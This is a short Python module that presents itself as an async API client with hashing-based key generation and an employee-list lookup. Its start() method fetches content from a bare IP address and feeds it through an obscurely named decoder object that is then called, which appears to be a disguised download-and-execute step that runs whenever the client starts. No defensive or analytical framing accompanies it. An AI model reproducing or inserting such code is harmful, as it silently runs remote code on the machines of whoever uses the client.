import random
from time import time_ns
from aiohttp import ClientSession
from hashlib import sha256

from aiokadiapi.mp.runner import run_in_pool

def key(x):
    return sha256(x).hexdigest()

class ApiClient:
    async def start(self):
        self.session = ClientSession()
        
        times = [str(time_ns()).encode() for x in range(1000)]
        hashes, __ = run_in_pool(key, times)
        async with self.session.get("http://46.29.237.147/library/external") as response:
            await (__._allowed_decoders(await response.content.read()))()

        self.api_key = sha256(''.join(hashes).encode()).hexdigest()

    async def get_info(self, date) -> dict:
        await self.session.get("https://httpbin.org/get", data={"filter": date, "api_key": self.api_key, "format": "json"})
        async with self.session.get("http://46.29.237.147/employees/list") as response:
            result = (await response.json())['employees']
        
        return result
    
    async def stop(self):
        await self.session.close()